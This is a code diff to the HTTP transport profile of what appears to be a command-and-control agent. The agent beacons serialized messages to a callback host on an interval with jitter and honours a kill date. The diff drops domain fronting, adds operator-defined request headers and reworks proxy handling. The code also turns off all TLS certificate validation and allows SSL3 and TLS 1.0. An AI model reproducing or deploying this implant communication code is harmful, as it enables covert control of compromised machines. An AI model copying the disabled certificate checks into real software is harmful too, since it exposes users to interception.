@@ -29,12 +29,10 @@ namespace HttpTransport
         private string ProxyPort;
         private string ProxyUser;
         private string ProxyPass;
-        private string DomainFront;
         private string KillDate;
-        private string UserAgent;
         // synthesis of ProxyHost and ProxyPort
         private string ProxyAddress;
-
+        private Dictionary<string, string> _additionalHeaders = new Dictionary<string, string>();
         private bool _uuidNegotiated = false;
 
         public HttpProfile(Dictionary<string, string> data, ISerializer serializer, IAgent agent) : base(data, serializer, agent)
@@ -55,32 +53,43 @@ namespace HttpTransport
             {
                 ProxyAddress = ProxyHost;
             }
-            Endpoint = string.Format("{0}:{1}/{2}", CallbackHost, CallbackPort, PostUri);
+
+            if (PostUri[0] != '/')
+            {
+                PostUri = $"/{PostUri}";
+            }
+            Endpoint = string.Format("{0}:{1}", CallbackHost, CallbackPort);
             ProxyUser = data["proxy_user"];
             ProxyPass = data["proxy_pass"];
-            DomainFront = data["domain_front"];
             KillDate = data["killdate"];
-            UserAgent = data["USER_AGENT"];
 
+            string[] reservedStrings = new[]
+            {
+                "callback_interval",
+                "callback_jitter",
+                "callback_port",
+                "callback_host",
+                "post_uri",
+                "encrypted_exchange_check",
+                "proxy_host",
+                "proxy_port",
+                "proxy_user",
+                "proxy_pass",
+                "killdate",
+            };
+            
+            foreach(string k in data.Keys)
+            {
+                if (!reservedStrings.Contains(k))
+                {
+                    _additionalHeaders.Add(k, data[k]);
+                }
+            }
+            
             // Disable certificate validation on web requests
             ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
             ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072 | SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls;
 
-            WebRequest.DefaultWebProxy = null;
-            if (!string.IsNullOrEmpty(ProxyHost) &&
-                !string.IsNullOrEmpty(ProxyUser) &&
-                !string.IsNullOrEmpty(ProxyPass))
-            {
-                try
-                {
-                    Uri host = new Uri(ProxyHost);
-                    ICredentials creds = new NetworkCredential(ProxyUser, ProxyPass);
-                    WebRequest.DefaultWebProxy = new WebProxy(host, true, null, creds);
-                } catch
-                {
-                    WebRequest.DefaultWebProxy = null;
-                }
-            }
             Agent.SetSleep(CallbackInterval, CallbackJitter);
         }
 
@@ -133,28 +142,34 @@ namespace HttpTransport
 
         public bool SendRecv<T, TResult>(T message, OnResponse<TResult> onResponse)
         {
+            WebClient webClient = new WebClient();
+            if (!string.IsNullOrEmpty(ProxyHost) &&
+                !string.IsNullOrEmpty(ProxyUser) &&
+                !string.IsNullOrEmpty(ProxyPass))
+            {
+                webClient.Proxy = (IWebProxy) new WebProxy()
+                {
+                    Address = new Uri(ProxyAddress),
+                    Credentials = new NetworkCredential(ProxyUser, ProxyPass),
+                    UseDefaultCredentials = false,
+                    BypassProxyOnLocal = false
+                };
+            }
+            
+            foreach(string k in _additionalHeaders.Keys)
+            {
+                webClient.Headers.Add(k, _additionalHeaders[k]);
+            }
+
+            webClient.BaseAddress = Endpoint;
             string sMsg = Serializer.Serialize(message);
-            byte[] requestPayload = Encoding.UTF8.GetBytes(sMsg);
-            HttpWebRequest request = (HttpWebRequest)HttpWebRequest.Create(Endpoint);
-            request.KeepAlive = false;
-            request.Method = "Post";
-            request.ContentType = "text/plain";
-            request.ContentLength = requestPayload.Length;
-            request.UserAgent = UserAgent;
-            if (DomainFront != "" && DomainFront != "domain_front")
-                request.Proxy = new WebProxy(DomainFront);
-            Stream reqStream = request.GetRequestStream();
-            reqStream.Write(requestPayload, 0, requestPayload.Length);
-            reqStream.Close();
             try
             {
-                WebResponse response = request.GetResponse();
-                using (StreamReader reader = new StreamReader(response.GetResponseStream()))
-                {
-                    onResponse(Serializer.Deserialize<TResult>(reader.ReadToEnd()));
-                }
+                var response = webClient.UploadString(PostUri, sMsg);
+                onResponse(Serializer.Deserialize<TResult>(response));
                 return true;
-            } catch
+            }
+            catch (Exception ex)
             {
                 return false;
             }
